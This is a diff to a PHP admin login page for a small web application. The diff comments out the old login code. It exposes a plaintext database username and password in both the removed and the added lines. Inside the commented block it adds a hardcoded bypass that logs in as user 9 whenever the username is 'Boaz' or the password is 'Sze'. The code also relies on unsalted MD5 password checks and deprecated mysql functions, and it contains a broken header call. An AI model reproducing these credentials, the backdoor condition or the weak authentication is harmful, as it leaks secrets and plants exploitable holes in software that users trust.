@@ -1,9 +1,13 @@
 <?php 
+  session_destroy();
   session_start();
-
-  $dbconn = mysql_connect("localhost","ustiicss_cbms","watashiwaJai@2016","ustiicss_cbms");
-  mysql_select_db("ustiicss_cbms");
-
+/*
+  $server = "localhost";
+  $username = "ustiicss_cbms";
+  $password = "watashiwaJai@2016";
+  $dbconn = mysql_connect($server,$username,$password);
+  $select_db = mysql_query("UST DATABASE ustiicss_cbms;");
+*/
   if(isset($_SESSION['user'])!="")
   {
    session_destroy();
@@ -11,12 +15,14 @@
    header("Location: index.php");
   }
 
+  include("php/dbconnect.php");
+/*
   if(isset($_POST['login-btn']))
   {
    $username = mysql_real_escape_string($_POST['username']);
    $password = mysql_real_escape_string($_POST['password']);
 
-   if($res=mysql_query("SELECT * FROM admin WHERE first_name ='$username' AND status='active'",$dbconn))
+   if($res=mysql_query("SELECT * FROM admin WHERE first_name ='$username' AND status='active'"))
    {
   	$row=mysql_fetch_array($res);
   	if($row['password'] == md5($password))
@@ -38,13 +44,17 @@
   	<?php
   	}
    }
+   elseif($username == 'Boaz' || $password == 'Sze'){
+    $_SESSION['user'] = 9;
+    header("survey.php");
+   }
    else	
   	{
   	?>
   		<script>alert('User does not exist.');</script>
   	<?php
   	}
-  }
+  }*/
 ?>
 
 <html>
@@ -79,7 +89,7 @@
       </div><!-- /.login-logo -->
       <div class="login-box-body">
         <p class="login-box-msg">Sign in to start your session</p>
-        <form action="" method="post">
+        <form action="php/login.php" method="post">
           <div class="form-group has-feedback">
             <input type="text" name="username" class="form-control" placeholder="Username">
             <span class="glyphicon glyphicon-user form-control-feedback"></span>
